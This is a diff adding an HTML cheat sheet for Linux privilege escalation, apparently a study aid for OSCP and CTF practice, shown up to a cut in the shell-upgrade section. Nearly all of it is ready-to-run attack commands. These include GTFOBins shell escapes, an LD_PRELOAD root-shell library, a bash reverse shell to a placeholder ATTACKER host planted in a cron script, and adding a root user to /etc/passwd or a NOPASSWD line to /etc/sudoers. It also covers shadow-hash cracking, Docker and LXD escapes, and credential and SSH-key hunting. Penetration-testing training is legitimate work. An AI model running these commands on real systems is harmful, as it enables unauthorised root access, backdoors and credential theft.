@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux Privilege Escalation — Cheat Sheet</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@400;600;700&display=swap');
+
+  :root {
+    --bg: #f5f0e8;
+    --paper: #faf7f2;
+    --ink: #1a1a18;
+    --muted: #5a5750;
+    --accent: #c0392b;
+    --accent2: #2c7a4b;
+    --accent3: #1a5276;
+    --rule: #c8c0b0;
+    --highlight: #fff3b0;
+    --tag-bg: #1a1a18;
+    --tag-fg: #f5f0e8;
+    --code-bg: #eee8da;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--ink);
+    font-family: 'IBM Plex Sans', sans-serif;
+    font-size: 13px;
+    line-height: 1.55;
+  }
+
+  /* ── MASTHEAD ── */
+  .masthead {
+    background: var(--ink);
+    color: var(--bg);
+    padding: 18px 32px 14px;
+    display: flex;
+    align-items: flex-end;
+    justify-content: space-between;
+    border-bottom: 4px solid var(--accent);
+  }
+  .masthead-left { display: flex; flex-direction: column; gap: 2px; }
+  .masthead-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 28px;
+    font-weight: 600;
+    letter-spacing: -0.5px;
+    line-height: 1;
+  }
+  .masthead-title span { color: var(--accent); }
+  .masthead-sub {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: #aaa;
+    margin-top: 3px;
+  }
+  .masthead-meta {
+    text-align: right;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: #888;
+    line-height: 1.8;
+  }
+  .masthead-meta strong { color: var(--bg); font-size: 11px; }
+
+  /* ── TICKER ── */
+  .ticker {
+    background: var(--accent);
+    color: #fff;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    padding: 4px 0;
+    overflow: hidden;
+    white-space: nowrap;
+  }
+  .ticker-inner {
+    display: inline-block;
+    animation: scroll 40s linear infinite;
+  }
+  .ticker-inner span { margin: 0 28px; }
+  @keyframes scroll {
+    from { transform: translateX(0); }
+    to { transform: translateX(-50%); }
+  }
+
+  /* ── LAYOUT ── */
+  .page {
+    max-width: 1280px;
+    margin: 0 auto;
+    padding: 20px 28px 40px;
+  }
+
+  /* ── SECTION LABEL ── */
+  .section-label {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 2.5px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 14px;
+    margin-top: 24px;
+  }
+  .section-label::before {
+    content: '';
+    display: inline-block;
+    width: 20px;
+    height: 2px;
+    background: var(--accent);
+  }
+
+  /* ── GRID ── */
+  .grid {
+    display: grid;
+    gap: 16px;
+  }
+  .grid-3 { grid-template-columns: repeat(3, 1fr); }
+  .grid-2 { grid-template-columns: repeat(2, 1fr); }
+  .grid-4 { grid-template-columns: repeat(4, 1fr); }
+  .span-2 { grid-column: span 2; }
+
+  /* ── CARD ── */
+  .card {
+    background: var(--paper);
+    border: 1px solid var(--rule);
+    border-top: 3px solid var(--ink);
+    padding: 14px 16px;
+  }
+  .card.red   { border-top-color: var(--accent); }
+  .card.green { border-top-color: var(--accent2); }
+  .card.blue  { border-top-color: var(--accent3); }
+  .card.gold  { border-top-color: #b7860b; }
+
+  .card-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--rule);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .card-title .dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: currentColor;
+    flex-shrink: 0;
+  }
+  .card.red   .card-title { color: var(--accent); }
+  .card.green .card-title { color: var(--accent2); }
+  .card.blue  .card-title { color: var(--accent3); }
+  .card.gold  .card-title { color: #b7860b; }
+
+  /* ── CODE BLOCKS ── */
+  pre, code {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11.5px;
+  }
+  .cmd {
+    background: var(--code-bg);
+    border-left: 3px solid var(--rule);
+    padding: 3px 8px;
+    margin: 3px 0;
+    display: block;
+    color: var(--ink);
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .cmd .prompt { color: var(--accent2); user-select: none; }
+  .cmd .flag   { color: var(--accent3); }
+  .cmd .path   { color: var(--accent); }
+  .cmd .comment { color: #999; font-style: italic; }
+
+  /* ── INLINE TAG ── */
+  .tag {
+    display: inline-block;
+    background: var(--tag-bg);
+    color: var(--tag-fg);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 9px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    padding: 1px 5px;
+    margin-right: 4px;
+  }
+  .tag.red   { background: var(--accent); }
+  .tag.green { background: var(--accent2); }
+  .tag.blue  { background: var(--accent3); }
+  .tag.gold  { background: #b7860b; }
+
+  /* ── NOTES / LIST ── */
+  .note-list { list-style: none; padding: 0; }
+  .note-list li {
+    padding: 3px 0;
+    border-bottom: 1px dotted var(--rule);
+    font-size: 12px;
+  }
+  .note-list li:last-child { border-bottom: none; }
+  .note-list li::before {
+    content: '›';
+    color: var(--accent);
+    font-weight: 700;
+    margin-right: 6px;
+  }
+
+  /* ── RULE ── */
+  .h-rule {
+    border: none;
+    border-top: 1px solid var(--rule);
+    margin: 8px 0;
+  }
+
+  /* ── CHECKLIST ── */
+  .checklist { list-style: none; padding: 0; }
+  .checklist li {
+    font-size: 12px;
+    padding: 2px 0 2px 18px;
+    position: relative;
+    border-bottom: 1px dotted var(--rule);
+  }
+  .checklist li:last-child { border-bottom: none; }
+  .checklist li::before {
+    content: '□';
+    position: absolute;
+    left: 0;
+    color: var(--muted);
+    font-size: 12px;
+  }
+
+  /* ── HIGHLIGHT BOX ── */
+  .alert {
+    background: var(--highlight);
+    border-left: 4px solid #b7860b;
+    padding: 8px 12px;
+    font-size: 12px;
+    margin: 6px 0;
+  }
+  .alert strong { font-weight: 600; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 11.5px;
+  }
+  th {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    background: var(--ink);
+    color: var(--bg);
+    padding: 5px 8px;
+    text-align: left;
+  }
+  td {
+    padding: 4px 8px;
+    border-bottom: 1px solid var(--rule);
+    vertical-align: top;
+  }
+  tr:nth-child(even) td { background: var(--code-bg); }
+  td code { font-size: 11px; color: var(--accent3); }
+
+  /* ── DIVIDER TEXT ── */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 20px 0 4px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--rule);
+  }
+
+  /* ── FOOTER ── */
+  .footer {
+    background: var(--ink);
+    color: #777;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    text-align: center;
+    padding: 10px;
+    margin-top: 30px;
+    letter-spacing: 1px;
+  }
+  .footer span { color: var(--accent); }
+
+  @media (max-width: 900px) {
+    .grid-3, .grid-4 { grid-template-columns: 1fr 1fr; }
+    .span-2 { grid-column: span 1; }
+  }
+  @media (max-width: 600px) {
+    .grid-3, .grid-2, .grid-4 { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- MASTHEAD -->
+<div class="masthead">
+  <div class="masthead-left">
+    <div class="masthead-title">Linux <span>PrivEsc</span> Cheat Sheet</div>
+    <div class="masthead-sub">Privilege Escalation Field Reference &nbsp;·&nbsp; 4JAI NOTES</div>
+  </div>
+  <div class="masthead-meta">
+    <strong>OSCP / CRTP / CTF READY</strong><br>
+    Enumeration · Exploitation · Post-Ex<br>
+    Rev. 2025 · by Ajai
+  </div>
+</div>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ticker-inner">
+    <span>whoami</span><span>id</span><span>sudo -l</span><span>find / -perm -4000 2>/dev/null</span><span>cat /etc/passwd</span><span>uname -a</span><span>ps aux</span><span>netstat -tulpn</span><span>env</span><span>crontab -l</span><span>ls -la /etc/cron*</span><span>linpeas.sh</span><span>linenum.sh</span><span>pspy64</span><span>cat /etc/sudoers</span><span>find / -writable 2>/dev/null</span>
+    <span>whoami</span><span>id</span><span>sudo -l</span><span>find / -perm -4000 2>/dev/null</span><span>cat /etc/passwd</span><span>uname -a</span><span>ps aux</span><span>netstat -tulpn</span><span>env</span><span>crontab -l</span><span>ls -la /etc/cron*</span><span>linpeas.sh</span><span>linenum.sh</span><span>pspy64</span><span>cat /etc/sudoers</span><span>find / -writable 2>/dev/null</span>
+  </div>
+</div>
+
+<div class="page">
+
+  <!-- ── SECTION 1: INITIAL ENUM ── -->
+  <div class="section-label">01 · Initial Enumeration</div>
+  <div class="grid grid-3">
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>System Info</div>
+      <code class="cmd"><span class="prompt">$ </span>uname -a</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/os-release</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /proc/version</code>
+      <code class="cmd"><span class="prompt">$ </span>hostname</code>
+      <code class="cmd"><span class="prompt">$ </span>lscpu</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Current User</div>
+      <code class="cmd"><span class="prompt">$ </span>id && whoami</code>
+      <code class="cmd"><span class="prompt">$ </span>groups</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo -l</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/passwd | grep sh$</code>
+      <code class="cmd"><span class="prompt">$ </span>w  <span class="comment"># who is logged in</span></code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Network</div>
+      <code class="cmd"><span class="prompt">$ </span>ip a</code>
+      <code class="cmd"><span class="prompt">$ </span>ss -tulpn</code>
+      <code class="cmd"><span class="prompt">$ </span>netstat -rn</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/hosts</code>
+      <code class="cmd"><span class="prompt">$ </span>arp -a</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Processes &amp; Services</div>
+      <code class="cmd"><span class="prompt">$ </span>ps aux</code>
+      <code class="cmd"><span class="prompt">$ </span>ps aux | grep root</code>
+      <code class="cmd"><span class="prompt">$ </span>systemctl list-units --type=service</code>
+      <code class="cmd"><span class="prompt">$ </span>ls -la /etc/init.d/</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Installed Software</div>
+      <code class="cmd"><span class="prompt">$ </span>dpkg -l  <span class="comment"># Debian</span></code>
+      <code class="cmd"><span class="prompt">$ </span>rpm -qa  <span class="comment"># RHEL</span></code>
+      <code class="cmd"><span class="prompt">$ </span>which python python3 perl ruby nc wget curl</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "*.py" 2>/dev/null</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Env &amp; History</div>
+      <code class="cmd"><span class="prompt">$ </span>env</code>
+      <code class="cmd"><span class="prompt">$ </span>cat ~/.bash_history</code>
+      <code class="cmd"><span class="prompt">$ </span>cat ~/.bashrc ~/.profile</code>
+      <code class="cmd"><span class="prompt">$ </span>printenv PATH</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/environment</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 2: AUTOMATED TOOLS ── -->
+  <div class="divider">Automated Enumeration</div>
+  <div class="grid grid-4">
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>LinPEAS</div>
+      <code class="cmd"><span class="comment"># Upload & run</span></code>
+      <code class="cmd"><span class="prompt">$ </span>curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
+      <code class="cmd"><span class="prompt">$ </span>./linpeas.sh <span class="flag">-a</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./linpeas.sh <span class="flag">| tee</span> out.txt</code>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>LinEnum</div>
+      <code class="cmd"><span class="comment"># Basic thorough check</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./LinEnum.sh</code>
+      <code class="cmd"><span class="prompt">$ </span>./LinEnum.sh <span class="flag">-t</span> <span class="comment"># thorough</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./LinEnum.sh <span class="flag">-r report.txt</span></code>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>pspy</div>
+      <code class="cmd"><span class="comment"># Monitor processes (no root)</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./pspy64</code>
+      <code class="cmd"><span class="prompt">$ </span>./pspy32 <span class="comment"># 32-bit</span></code>
+      <code class="cmd"><span class="comment"># Watch cronjobs live!</span></code>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Linux Smart Enum</div>
+      <code class="cmd"><span class="prompt">$ </span>./lse.sh</code>
+      <code class="cmd"><span class="prompt">$ </span>./lse.sh <span class="flag">-l 1</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./lse.sh <span class="flag">-i</span> <span class="comment"># no colors</span></code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 3: SUDO ABUSE ── -->
+  <div class="section-label">02 · Sudo Abuse</div>
+  <div class="grid grid-3">
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Check Sudo Perms</div>
+      <code class="cmd"><span class="prompt">$ </span>sudo -l</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo -V</code>
+      <code class="cmd"><span class="comment"># Look for NOPASSWD entries</span></code>
+      <div class="alert"><strong>GTFOBins:</strong> Check gtfobins.github.io for any allowed binary</div>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Common GTFOBins</div>
+      <code class="cmd"><span class="prompt">$ </span>sudo vim -c ':!/bin/bash'</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo find . -exec /bin/bash \;</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo awk 'BEGIN {system("/bin/bash")}'</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo python3 -c "import os;os.system('/bin/bash')"</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo less /etc/passwd  <span class="comment"># then !/bin/bash</span></code>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Sudo with SETENV</div>
+      <code class="cmd"><span class="comment"># If SETENV is allowed:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>sudo LD_PRELOAD=/tmp/evil.so find</code>
+      <code class="cmd"><span class="comment">evil.so code:</span></code>
+      <code class="cmd"><span class="path">// gcc -fPIC -shared -o evil.so evil.c -nostartfiles</span></code>
+      <code class="cmd">void _init() {</code>
+      <code class="cmd">  setuid(0); system("/bin/bash"); }</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 4: SUID / SGID ── -->
+  <div class="section-label">03 · SUID / SGID</div>
+  <div class="grid grid-2">
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Find SUID / SGID Binaries</div>
+      <code class="cmd"><span class="comment"># SUID</span></code>
+      <code class="cmd"><span class="prompt">$ </span>find / <span class="flag">-perm -4000</span> -type f 2>/dev/null</code>
+      <code class="cmd"><span class="comment"># SGID</span></code>
+      <code class="cmd"><span class="prompt">$ </span>find / <span class="flag">-perm -2000</span> -type f 2>/dev/null</code>
+      <code class="cmd"><span class="comment"># Both</span></code>
+      <code class="cmd"><span class="prompt">$ </span>find / <span class="flag">-perm /6000</span> -type f 2>/dev/null</code>
+      <code class="cmd"><span class="comment"># Owned by root with SUID</span></code>
+      <code class="cmd"><span class="prompt">$ </span>find / -user root -perm -4000 2>/dev/null</code>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Common SUID Exploits</div>
+      <table>
+        <tr><th>Binary</th><th>Command</th></tr>
+        <tr><td><code>bash</code></td><td><code>bash -p</code></td></tr>
+        <tr><td><code>cp</code></td><td>Overwrite /etc/passwd</td></tr>
+        <tr><td><code>find</code></td><td><code>find . -exec /bin/bash \;</code></td></tr>
+        <tr><td><code>vim/nano</code></td><td>Edit /etc/sudoers</td></tr>
+        <tr><td><code>python</code></td><td><code>python -c "import os;os.setuid(0);os.system('/bin/sh')"</code></td></tr>
+        <tr><td><code>nmap</code></td><td><code>nmap --interactive → !sh</code></td></tr>
+        <tr><td><code>pkexec</code></td><td>CVE-2021-4034 (PwnKit)</td></tr>
+      </table>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 5: CRON JOBS ── -->
+  <div class="section-label">04 · Cron Jobs</div>
+  <div class="grid grid-3">
+
+    <div class="card gold">
+      <div class="card-title"><span class="dot"></span>Find Cron Jobs</div>
+      <code class="cmd"><span class="prompt">$ </span>crontab -l</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/crontab</code>
+      <code class="cmd"><span class="prompt">$ </span>ls -la /etc/cron.d/</code>
+      <code class="cmd"><span class="prompt">$ </span>ls -la /etc/cron.{hourly,daily,weekly}/</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /var/spool/cron/crontabs/root</code>
+      <code class="cmd"><span class="prompt">$ </span>./pspy64  <span class="comment"># monitor live</span></code>
+    </div>
+
+    <div class="card gold">
+      <div class="card-title"><span class="dot"></span>Writable Cron Script</div>
+      <code class="cmd"><span class="comment"># If script is writable:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>echo 'chmod +s /bin/bash' >> /path/to/script.sh</code>
+      <code class="cmd"><span class="comment"># Wait for cron, then:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>bash -p</code>
+      <hr class="h-rule">
+      <code class="cmd"><span class="comment"># Or add reverse shell:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> script.sh</code>
+    </div>
+
+    <div class="card gold">
+      <div class="card-title"><span class="dot"></span>PATH Hijacking via Cron</div>
+      <code class="cmd"><span class="comment"># crontab uses PATH=/usr/sbin:/usr/bin</span></code>
+      <code class="cmd"><span class="comment"># If cron calls script without full path:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>echo '#!/bin/bash' > /tmp/script.sh</code>
+      <code class="cmd"><span class="prompt">$ </span>echo 'chmod +s /bin/bash' >> /tmp/script.sh</code>
+      <code class="cmd"><span class="prompt">$ </span>chmod +x /tmp/script.sh</code>
+      <code class="cmd"><span class="comment"># Ensure /tmp is earlier in PATH</span></code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 6: FILE PERMISSIONS ── -->
+  <div class="section-label">05 · File Permissions &amp; Writable Files</div>
+  <div class="grid grid-3">
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>World-Writable Files</div>
+      <code class="cmd"><span class="prompt">$ </span>find / -writable -type f 2>/dev/null | grep -v proc</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -perm -o+w -type f 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -perm -222 -type d 2>/dev/null  <span class="comment"># writable dirs</span></code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>/etc/passwd Writable</div>
+      <code class="cmd"><span class="comment"># Generate password hash:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>openssl passwd -1 -salt abc password123</code>
+      <code class="cmd"><span class="comment"># Add root user:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>echo 'evil:$1$abc$HASH:0:0::/root:/bin/bash' >> /etc/passwd</code>
+      <code class="cmd"><span class="prompt">$ </span>su evil</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>/etc/shadow Readable</div>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/shadow</code>
+      <code class="cmd"><span class="comment"># Crack with hashcat:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>hashcat -m 1800 shadow.txt rockyou.txt</code>
+      <code class="cmd"><span class="comment"># Crack with john:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>unshadow passwd shadow > hashes.txt</code>
+      <code class="cmd"><span class="prompt">$ </span>john hashes.txt --wordlist=rockyou.txt</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 7: CAPABILITIES ── -->
+  <div class="section-label">06 · Linux Capabilities</div>
+  <div class="grid grid-2">
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Find Capabilities</div>
+      <code class="cmd"><span class="prompt">$ </span>getcap -r / 2>/dev/null</code>
+      <code class="cmd"><span class="comment"># Look for dangerous ones:</span></code>
+      <ul class="note-list">
+        <li><code>cap_setuid+ep</code> — set UID to root</li>
+        <li><code>cap_net_raw+ep</code> — raw sockets</li>
+        <li><code>cap_sys_admin</code> — almost root</li>
+        <li><code>cap_dac_read_search</code> — read any file</li>
+        <li><code>cap_sys_ptrace</code> — process injection</li>
+      </ul>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Capability Exploitation</div>
+      <code class="cmd"><span class="comment"># python3 cap_setuid+ep</span></code>
+      <code class="cmd"><span class="prompt">$ </span>python3 -c "import os; os.setuid(0); os.system('/bin/bash')"</code>
+      <hr class="h-rule">
+      <code class="cmd"><span class="comment"># perl cap_setuid+ep</span></code>
+      <code class="cmd"><span class="prompt">$ </span>perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'</code>
+      <hr class="h-rule">
+      <code class="cmd"><span class="comment"># vim cap_dac_read_search</span></code>
+      <code class="cmd"><span class="prompt">$ </span>vim /etc/shadow</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 8: PATH HIJACKING ── -->
+  <div class="section-label">07 · PATH Hijacking</div>
+  <div class="grid grid-2">
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>PATH Injection</div>
+      <code class="cmd"><span class="comment"># If SUID binary calls command without full path:</span></code>
+      <code class="cmd"><span class="comment"># e.g. system("ps") instead of system("/bin/ps")</span></code>
+      <hr class="h-rule">
+      <code class="cmd"><span class="prompt">$ </span>echo '/bin/bash' > /tmp/ps</code>
+      <code class="cmd"><span class="prompt">$ </span>chmod +x /tmp/ps</code>
+      <code class="cmd"><span class="prompt">$ </span>export PATH=/tmp:$PATH</code>
+      <code class="cmd"><span class="prompt">$ </span>./vulnerable_suid_binary</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Find PATH Vulnerability</div>
+      <code class="cmd"><span class="comment"># Decompile / strings to check calls:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>strings /path/to/suid_binary</code>
+      <code class="cmd"><span class="prompt">$ </span>strace ./binary 2>&1 | grep exec</code>
+      <code class="cmd"><span class="prompt">$ </span>ltrace ./binary 2>&1</code>
+      <code class="cmd"><span class="comment"># Check for relative path calls (no leading /)</span></code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 9: KERNEL EXPLOITS ── -->
+  <div class="section-label">08 · Kernel Exploits</div>
+  <div class="grid grid-4">
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Get Kernel Version</div>
+      <code class="cmd"><span class="prompt">$ </span>uname -r</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /proc/version</code>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/lsb-release</code>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Famous CVEs</div>
+      <ul class="note-list">
+        <li>DirtyC0w — CVE-2016-5195</li>
+        <li>PwnKit — CVE-2021-4034</li>
+        <li>DirtyPipe — CVE-2022-0847</li>
+        <li>OverlayFS — CVE-2023-0386</li>
+        <li>Baron Samedit — CVE-2021-3156</li>
+      </ul>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>Find Exploits</div>
+      <code class="cmd"><span class="prompt">$ </span>searchsploit linux kernel 4.4</code>
+      <code class="cmd"><span class="comment"># linux-exploit-suggester:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./les.sh</code>
+      <code class="cmd"><span class="prompt">$ </span>./linux-exploit-suggester-2.pl</code>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>DirtyPipe (2022)</div>
+      <code class="cmd"><span class="comment"># Kernel 5.8 - 5.16.11</span></code>
+      <code class="cmd"><span class="prompt">$ </span>./dirtypipe</code>
+      <code class="cmd"><span class="comment"># Overwrites read-only files</span></code>
+      <code class="cmd"><span class="comment"># Can patch /etc/passwd</span></code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 10: CREDENTIALS ── -->
+  <div class="section-label">09 · Credential Hunting</div>
+  <div class="grid grid-3">
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Config Files</div>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "*.conf" 2>/dev/null | xargs grep -i pass 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "wp-config.php" 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name ".env" 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "*.xml" | xargs grep -i password 2>/dev/null</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>SSH Keys &amp; History</div>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "id_rsa" 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "authorized_keys" 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>cat ~/.ssh/*</code>
+      <code class="cmd"><span class="prompt">$ </span>cat ~/.bash_history | grep -i pass</code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "*.log" | xargs grep -i password 2>/dev/null</code>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>Database &amp; App Creds</div>
+      <code class="cmd"><span class="prompt">$ </span>cat /var/www/html/config.php</code>
+      <code class="cmd"><span class="prompt">$ </span>mysql -u root -p  <span class="comment"># try empty/root</span></code>
+      <code class="cmd"><span class="prompt">$ </span>find / -name "*.db" -o -name "*.sqlite" 2>/dev/null</code>
+      <code class="cmd"><span class="prompt">$ </span>grep -r "password" /var/www/ 2>/dev/null</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 11: NFS ── -->
+  <div class="section-label">10 · NFS · Docker · LXC · Misc</div>
+  <div class="grid grid-4">
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>NFS no_root_squash</div>
+      <code class="cmd"><span class="prompt">$ </span>cat /etc/exports</code>
+      <code class="cmd"><span class="comment"># On attacker:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>showmount -e TARGET</code>
+      <code class="cmd"><span class="prompt">$ </span>mount -t nfs TARGET:/share /mnt/nfs</code>
+      <code class="cmd"><span class="comment"># Copy bash, setuid:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>cp /bin/bash /mnt/nfs/bash</code>
+      <code class="cmd"><span class="prompt">$ </span>chmod +s /mnt/nfs/bash</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Docker Group</div>
+      <code class="cmd"><span class="prompt">$ </span>id  <span class="comment"># check for docker group</span></code>
+      <code class="cmd"><span class="prompt">$ </span>docker images</code>
+      <code class="cmd"><span class="comment"># Mount host FS:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>LXC/LXD Group</div>
+      <code class="cmd"><span class="prompt">$ </span>id  <span class="comment"># check for lxd group</span></code>
+      <code class="cmd"><span class="comment"># Import Alpine image:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>lxc image import alpine.tar.gz --alias myimage</code>
+      <code class="cmd"><span class="prompt">$ </span>lxc init myimage priv -c security.privileged=true</code>
+      <code class="cmd"><span class="prompt">$ </span>lxc config device add priv host-root disk source=/ path=/mnt/root</code>
+      <code class="cmd"><span class="prompt">$ </span>lxc start priv && lxc exec priv /bin/sh</code>
+    </div>
+
+    <div class="card blue">
+      <div class="card-title"><span class="dot"></span>Writable /etc/sudoers</div>
+      <code class="cmd"><span class="prompt">$ </span>ls -la /etc/sudoers</code>
+      <code class="cmd"><span class="comment"># If writable:</span></code>
+      <code class="cmd"><span class="prompt">$ </span>echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers</code>
+      <code class="cmd"><span class="prompt">$ </span>sudo bash</code>
+    </div>
+
+  </div>
+
+  <!-- ── SECTION 12: SHELL STABILIZE ── -->
+  <div class="section-label">11 · Shell Upgrade &amp; Stabilization</div>
+  <div class="grid grid-3">
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Python PTY</div>
+      <code class="cmd"><span class="prompt">$ </span>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+      <code class="cmd">Ctrl+Z  <span class="comment"># background</span></code>
+      <code class="cmd"><span class="prompt">$ </span>stty raw -echo; fg</code>
+      <code class="cmd"><span class="prompt">$ </span>export TERM=xterm</code>
+      <code class="cmd"><span class="prompt">$ </span>stty rows 50 cols 220</code>
+    </div>
+
+    <div class="card green">
+      <div class="card-title"><span class="dot"></span>Other Upgrade Methods</div>
